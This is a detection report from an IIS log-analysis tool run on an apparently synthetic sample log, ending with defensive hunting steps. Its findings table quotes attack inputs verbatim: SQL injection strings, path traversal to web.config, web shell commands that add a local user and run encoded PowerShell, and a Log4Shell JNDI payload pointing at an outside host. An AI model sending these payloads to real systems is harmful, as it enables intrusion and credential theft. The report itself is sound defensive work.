# W3CSaw Scan Report

**Tool:** W3CSaw v0.1.0  
**Input:** `examples/sample_iis.log`  
**Rules:** `rules/` (21 loaded)  
**Scan time:** 2026-07-03 01:55:35 UTC  
**Files parsed:** 1  
**Lines parsed:** 342  
**Total findings:** 138

## Findings by Severity

| Severity | Count |
|---|---|
| critical | 1 |
| high | 8 |
| medium | 4 |
| low | 125 |

## Top Source IPs

| Value | Findings |
|---|---|
| 203.0.113.66 | 119 |
| 198.51.100.23 | 18 |
| 203.0.113.99 | 1 |

## Top Suspicious URI Paths

| Value | Findings |
|---|---|
| /owa/auth.owa | 14 |
| /products.aspx | 4 |
| /download.aspx | 4 |
| /uploads/profile.ashx | 4 |
| /admin99.aspx | 2 |
| /admin0.aspx | 1 |
| /admin1.aspx | 1 |
| /admin2.aspx | 1 |
| /admin3.aspx | 1 |
| /admin4.aspx | 1 |

## Top User Agents

| Value | Findings |
|---|---|
| gobuster/3.6 | 111 |
| python-requests/2.31 | 14 |
| curl/8.4.0 | 8 |
| sqlmap/1.7.11#stable+(https://sqlmap.org) | 4 |
| Mozilla/5.0 | 1 |

## Rule Hit Summary

| Rule ID | Title | Level | Hits |
|---|---|---|---|
| `iis_scanner_user_agent` | IIS Request From Known Scanner User Agent | low | 125 |
| `iis_webshell_command_execution_query` | IIS Possible Web Shell Command Execution via Query String | high | 3 |
| `iis_sql_injection_keywords` | IIS SQL Injection Keywords in Request | high | 2 |
| `iis_path_traversal` | IIS Path Traversal Attempt | high | 2 |
| `iis_high_404_single_source` | IIS High 404 Volume From Single Source | medium | 1 |
| `iis_double_url_encoding` | IIS Double URL Encoding Detected | medium | 1 |
| `iis_bruteforce_then_success` | IIS 401/403 Brute Force Followed by Success | high | 1 |
| `iis_suspicious_post_dynamic_script` | IIS Suspicious POST to Dynamic Script Without Referer | medium | 1 |
| `iis_log4shell_payload` | IIS Possible Log4Shell (CVE-2021-44228) Payload | critical | 1 |
| `iis_rare_successful_dynamic_extension` | IIS Rare Successfully Accessed Dynamic Script | medium | 1 |

## Detailed Findings

| Timestamp | Level | Rule | Source IP | Method | URI | Query | Status | Source Line |
|---|---|---|---|---|---|---|---|---|
| 2026-07-03T11:15:00Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin0.aspx | - | 404 | examples/sample_iis.log:215 |
| 2026-07-03T11:15:11Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin1.aspx | - | 404 | examples/sample_iis.log:216 |
| 2026-07-03T11:15:22Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin2.aspx | - | 404 | examples/sample_iis.log:217 |
| 2026-07-03T11:15:33Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin3.aspx | - | 404 | examples/sample_iis.log:218 |
| 2026-07-03T11:15:44Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin4.aspx | - | 404 | examples/sample_iis.log:219 |
| 2026-07-03T11:15:55Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin5.aspx | - | 404 | examples/sample_iis.log:220 |
| 2026-07-03T11:16:06Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin6.aspx | - | 404 | examples/sample_iis.log:221 |
| 2026-07-03T11:16:17Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin7.aspx | - | 404 | examples/sample_iis.log:222 |
| 2026-07-03T11:16:28Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin8.aspx | - | 404 | examples/sample_iis.log:223 |
| 2026-07-03T11:16:39Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin9.aspx | - | 404 | examples/sample_iis.log:224 |
| 2026-07-03T11:16:50Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin10.aspx | - | 404 | examples/sample_iis.log:225 |
| 2026-07-03T11:16:01Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin11.aspx | - | 404 | examples/sample_iis.log:226 |
| 2026-07-03T11:17:12Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin12.aspx | - | 404 | examples/sample_iis.log:227 |
| 2026-07-03T11:17:23Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin13.aspx | - | 404 | examples/sample_iis.log:228 |
| 2026-07-03T11:17:34Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin14.aspx | - | 404 | examples/sample_iis.log:229 |
| 2026-07-03T11:17:45Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin15.aspx | - | 404 | examples/sample_iis.log:230 |
| 2026-07-03T11:17:56Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin16.aspx | - | 404 | examples/sample_iis.log:231 |
| 2026-07-03T11:17:07Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin17.aspx | - | 404 | examples/sample_iis.log:232 |
| 2026-07-03T11:18:18Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin18.aspx | - | 404 | examples/sample_iis.log:233 |
| 2026-07-03T11:18:29Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin19.aspx | - | 404 | examples/sample_iis.log:234 |
| 2026-07-03T11:18:40Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin20.aspx | - | 404 | examples/sample_iis.log:235 |
| 2026-07-03T11:18:51Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin21.aspx | - | 404 | examples/sample_iis.log:236 |
| 2026-07-03T11:18:02Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin22.aspx | - | 404 | examples/sample_iis.log:237 |
| 2026-07-03T11:18:13Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin23.aspx | - | 404 | examples/sample_iis.log:238 |
| 2026-07-03T11:19:24Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin24.aspx | - | 404 | examples/sample_iis.log:239 |
| 2026-07-03T11:19:35Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin25.aspx | - | 404 | examples/sample_iis.log:240 |
| 2026-07-03T11:19:46Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin26.aspx | - | 404 | examples/sample_iis.log:241 |
| 2026-07-03T11:19:57Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin27.aspx | - | 404 | examples/sample_iis.log:242 |
| 2026-07-03T11:19:08Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin28.aspx | - | 404 | examples/sample_iis.log:243 |
| 2026-07-03T11:19:19Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin29.aspx | - | 404 | examples/sample_iis.log:244 |
| 2026-07-03T11:20:30Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin30.aspx | - | 404 | examples/sample_iis.log:245 |
| 2026-07-03T11:20:41Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin31.aspx | - | 404 | examples/sample_iis.log:246 |
| 2026-07-03T11:20:52Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin32.aspx | - | 404 | examples/sample_iis.log:247 |
| 2026-07-03T11:20:03Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin33.aspx | - | 404 | examples/sample_iis.log:248 |
| 2026-07-03T11:20:14Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin34.aspx | - | 404 | examples/sample_iis.log:249 |
| 2026-07-03T11:20:25Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin35.aspx | - | 404 | examples/sample_iis.log:250 |
| 2026-07-03T11:21:36Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin36.aspx | - | 404 | examples/sample_iis.log:251 |
| 2026-07-03T11:21:47Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin37.aspx | - | 404 | examples/sample_iis.log:252 |
| 2026-07-03T11:21:58Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin38.aspx | - | 404 | examples/sample_iis.log:253 |
| 2026-07-03T11:21:09Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin39.aspx | - | 404 | examples/sample_iis.log:254 |
| 2026-07-03T11:21:20Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin40.aspx | - | 404 | examples/sample_iis.log:255 |
| 2026-07-03T11:21:31Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin41.aspx | - | 404 | examples/sample_iis.log:256 |
| 2026-07-03T11:22:42Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin42.aspx | - | 404 | examples/sample_iis.log:257 |
| 2026-07-03T11:22:53Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin43.aspx | - | 404 | examples/sample_iis.log:258 |
| 2026-07-03T11:22:04Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin44.aspx | - | 404 | examples/sample_iis.log:259 |
| 2026-07-03T11:22:15Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin45.aspx | - | 404 | examples/sample_iis.log:260 |
| 2026-07-03T11:22:26Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin46.aspx | - | 404 | examples/sample_iis.log:261 |
| 2026-07-03T11:22:37Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin47.aspx | - | 404 | examples/sample_iis.log:262 |
| 2026-07-03T11:23:48Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin48.aspx | - | 404 | examples/sample_iis.log:263 |
| 2026-07-03T11:23:59Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin49.aspx | - | 404 | examples/sample_iis.log:264 |
| 2026-07-03T11:23:10Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin50.aspx | - | 404 | examples/sample_iis.log:265 |
| 2026-07-03T11:23:21Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin51.aspx | - | 404 | examples/sample_iis.log:266 |
| 2026-07-03T11:23:32Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin52.aspx | - | 404 | examples/sample_iis.log:267 |
| 2026-07-03T11:23:43Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin53.aspx | - | 404 | examples/sample_iis.log:268 |
| 2026-07-03T11:24:54Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin54.aspx | - | 404 | examples/sample_iis.log:269 |
| 2026-07-03T11:24:05Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin55.aspx | - | 404 | examples/sample_iis.log:270 |
| 2026-07-03T11:24:16Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin56.aspx | - | 404 | examples/sample_iis.log:271 |
| 2026-07-03T11:24:27Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin57.aspx | - | 404 | examples/sample_iis.log:272 |
| 2026-07-03T11:24:38Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin58.aspx | - | 404 | examples/sample_iis.log:273 |
| 2026-07-03T11:24:49Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin59.aspx | - | 404 | examples/sample_iis.log:274 |
| 2026-07-03T11:25:00Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin60.aspx | - | 404 | examples/sample_iis.log:275 |
| 2026-07-03T11:25:11Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin61.aspx | - | 404 | examples/sample_iis.log:276 |
| 2026-07-03T11:25:22Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin62.aspx | - | 404 | examples/sample_iis.log:277 |
| 2026-07-03T11:25:33Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin63.aspx | - | 404 | examples/sample_iis.log:278 |
| 2026-07-03T11:25:44Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin64.aspx | - | 404 | examples/sample_iis.log:279 |
| 2026-07-03T11:25:55Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin65.aspx | - | 404 | examples/sample_iis.log:280 |
| 2026-07-03T11:26:06Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin66.aspx | - | 404 | examples/sample_iis.log:281 |
| 2026-07-03T11:26:17Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin67.aspx | - | 404 | examples/sample_iis.log:282 |
| 2026-07-03T11:26:28Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin68.aspx | - | 404 | examples/sample_iis.log:283 |
| 2026-07-03T11:26:39Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin69.aspx | - | 404 | examples/sample_iis.log:284 |
| 2026-07-03T11:26:50Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin70.aspx | - | 404 | examples/sample_iis.log:285 |
| 2026-07-03T11:26:01Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin71.aspx | - | 404 | examples/sample_iis.log:286 |
| 2026-07-03T11:27:12Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin72.aspx | - | 404 | examples/sample_iis.log:287 |
| 2026-07-03T11:27:23Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin73.aspx | - | 404 | examples/sample_iis.log:288 |
| 2026-07-03T11:27:34Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin74.aspx | - | 404 | examples/sample_iis.log:289 |
| 2026-07-03T11:27:45Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin75.aspx | - | 404 | examples/sample_iis.log:290 |
| 2026-07-03T11:27:56Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin76.aspx | - | 404 | examples/sample_iis.log:291 |
| 2026-07-03T11:27:07Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin77.aspx | - | 404 | examples/sample_iis.log:292 |
| 2026-07-03T11:28:18Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin78.aspx | - | 404 | examples/sample_iis.log:293 |
| 2026-07-03T11:28:29Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin79.aspx | - | 404 | examples/sample_iis.log:294 |
| 2026-07-03T11:28:40Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin80.aspx | - | 404 | examples/sample_iis.log:295 |
| 2026-07-03T11:28:51Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin81.aspx | - | 404 | examples/sample_iis.log:296 |
| 2026-07-03T11:28:02Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin82.aspx | - | 404 | examples/sample_iis.log:297 |
| 2026-07-03T11:28:13Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin83.aspx | - | 404 | examples/sample_iis.log:298 |
| 2026-07-03T11:29:24Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin84.aspx | - | 404 | examples/sample_iis.log:299 |
| 2026-07-03T11:29:35Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin85.aspx | - | 404 | examples/sample_iis.log:300 |
| 2026-07-03T11:29:46Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin86.aspx | - | 404 | examples/sample_iis.log:301 |
| 2026-07-03T11:29:57Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin87.aspx | - | 404 | examples/sample_iis.log:302 |
| 2026-07-03T11:29:08Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin88.aspx | - | 404 | examples/sample_iis.log:303 |
| 2026-07-03T11:29:19Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin89.aspx | - | 404 | examples/sample_iis.log:304 |
| 2026-07-03T11:30:30Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin90.aspx | - | 404 | examples/sample_iis.log:305 |
| 2026-07-03T11:30:41Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin91.aspx | - | 404 | examples/sample_iis.log:306 |
| 2026-07-03T11:30:52Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin92.aspx | - | 404 | examples/sample_iis.log:307 |
| 2026-07-03T11:30:03Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin93.aspx | - | 404 | examples/sample_iis.log:308 |
| 2026-07-03T11:30:14Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin94.aspx | - | 404 | examples/sample_iis.log:309 |
| 2026-07-03T11:30:25Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin95.aspx | - | 404 | examples/sample_iis.log:310 |
| 2026-07-03T11:31:36Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin96.aspx | - | 404 | examples/sample_iis.log:311 |
| 2026-07-03T11:31:47Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin97.aspx | - | 404 | examples/sample_iis.log:312 |
| 2026-07-03T11:31:58Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin98.aspx | - | 404 | examples/sample_iis.log:313 |
| 2026-07-03T11:31:09Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin99.aspx | - | 404 | examples/sample_iis.log:314 |
| 2026-07-03T11:31:09Z | medium | `iis_high_404_single_source` | 203.0.113.66 | GET | /admin99.aspx | - | 404 | examples/sample_iis.log:314 |
| 2026-07-03T11:31:20Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin100.aspx | - | 404 | examples/sample_iis.log:315 |
| 2026-07-03T11:31:31Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin101.aspx | - | 404 | examples/sample_iis.log:316 |
| 2026-07-03T11:32:42Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin102.aspx | - | 404 | examples/sample_iis.log:317 |
| 2026-07-03T11:32:53Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin103.aspx | - | 404 | examples/sample_iis.log:318 |
| 2026-07-03T11:32:04Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin104.aspx | - | 404 | examples/sample_iis.log:319 |
| 2026-07-03T11:32:15Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin105.aspx | - | 404 | examples/sample_iis.log:320 |
| 2026-07-03T11:32:26Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin106.aspx | - | 404 | examples/sample_iis.log:321 |
| 2026-07-03T11:32:37Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin107.aspx | - | 404 | examples/sample_iis.log:322 |
| 2026-07-03T11:33:48Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin108.aspx | - | 404 | examples/sample_iis.log:323 |
| 2026-07-03T11:33:59Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /admin109.aspx | - | 404 | examples/sample_iis.log:324 |
| 2026-07-03T11:41:02Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /products.aspx | id=1%27%20or%201%3D1-- | 500 | examples/sample_iis.log:325 |
| 2026-07-03T11:41:02Z | high | `iis_sql_injection_keywords` | 203.0.113.66 | GET | /products.aspx | id=1%27%20or%201%3D1-- | 500 | examples/sample_iis.log:325 |
| 2026-07-03T11:41:05Z | low | `iis_scanner_user_agent` | 203.0.113.66 | GET | /products.aspx | id=1%20union%20select%20username,password%20from%20users | 500 | examples/sample_iis.log:326 |
| 2026-07-03T11:41:05Z | high | `iis_sql_injection_keywords` | 203.0.113.66 | GET | /products.aspx | id=1%20union%20select%20username,password%20from%20users | 500 | examples/sample_iis.log:326 |
| 2026-07-03T11:44:19Z | high | `iis_path_traversal` | 203.0.113.66 | GET | /download.aspx | file=..%2f..%2f..%2fweb.config | 200 | examples/sample_iis.log:327 |
| 2026-07-03T11:44:31Z | medium | `iis_double_url_encoding` | 203.0.113.66 | GET | /download.aspx | file=%252e%252e%252fweb.config | 404 | examples/sample_iis.log:328 |
| 2026-07-03T11:44:31Z | high | `iis_path_traversal` | 203.0.113.66 | GET | /download.aspx | file=%252e%252e%252fweb.config | 404 | examples/sample_iis.log:328 |
| 2026-07-03T12:00:00Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:329 |
| 2026-07-03T12:00:13Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:330 |
| 2026-07-03T12:00:26Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:331 |
| 2026-07-03T12:00:39Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:332 |
| 2026-07-03T12:00:52Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:333 |
| 2026-07-03T12:00:05Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:334 |
| 2026-07-03T12:00:18Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:335 |
| 2026-07-03T12:00:31Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:336 |
| 2026-07-03T12:00:44Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:337 |
| 2026-07-03T12:00:57Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:338 |
| 2026-07-03T12:01:10Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:339 |
| 2026-07-03T12:01:23Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 401 | examples/sample_iis.log:340 |
| 2026-07-03T12:02:44Z | low | `iis_scanner_user_agent` | 198.51.100.23 | POST | /owa/auth.owa | - | 200 | examples/sample_iis.log:341 |
| 2026-07-03T12:02:44Z | high | `iis_bruteforce_then_success` | 198.51.100.23 | POST | /owa/auth.owa | - | 200 | examples/sample_iis.log:341 |
| 2026-07-03T12:15:03Z | medium | `iis_suspicious_post_dynamic_script` | 198.51.100.23 | POST | /uploads/profile.ashx | - | 201 | examples/sample_iis.log:342 |
| 2026-07-03T12:15:41Z | high | `iis_webshell_command_execution_query` | 198.51.100.23 | GET | /uploads/profile.ashx | cmd=whoami | 200 | examples/sample_iis.log:343 |
| 2026-07-03T12:16:12Z | high | `iis_webshell_command_execution_query` | 198.51.100.23 | GET | /uploads/profile.ashx | cmd=net+user+backup+P%40ss+%2Fadd | 200 | examples/sample_iis.log:344 |
| 2026-07-03T12:17:55Z | high | `iis_webshell_command_execution_query` | 198.51.100.23 | GET | /uploads/profile.ashx | cmd=powershell+-enc+SQBFAFgA | 200 | examples/sample_iis.log:345 |
| 2026-07-03T12:30:00Z | critical | `iis_log4shell_payload` | 203.0.113.99 | GET | /api/search.aspx | q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.99%2Fa%7D | 404 | examples/sample_iis.log:346 |
| 2026-07-03T11:44:19Z | medium | `iis_rare_successful_dynamic_extension` | 203.0.113.66 | GET | /download.aspx | file=..%2f..%2f..%2fweb.config | 200 | examples/sample_iis.log:327 |

## Analyst Notes

_Add triage notes, verdicts, and scoping decisions here._

## Recommended Next Hunting Steps

Correlate W3CSaw findings with host and network telemetry before drawing
conclusions -- IIS logs show HTTP activity, not code execution:

- **Security.evtx** -- logons around finding timestamps (4624/4625/4672).
- **System.evtx / Application.evtx** -- service installs, crashes, IIS worker events.
- **Microsoft-Windows-PowerShell/Operational.evtx** -- script block logging (4104).
- **Microsoft-Windows-Sysmon/Operational.evtx** -- process creation and network events.
- **w3wp.exe child processes** -- cmd.exe / powershell.exe spawned by the IIS
  worker process is a strong web shell indicator.
- **Web root file changes** -- new or modified .aspx/.ashx/.asmx files
  ($MFT, USN journal, file timestamps) near finding timestamps.
- **IIS configuration** -- new virtual directories, handlers, or modules.
- **EDR process trees and outbound connections** from the web server.
- **Persistence** -- new services, scheduled tasks, and local users created
  shortly after suspicious requests.
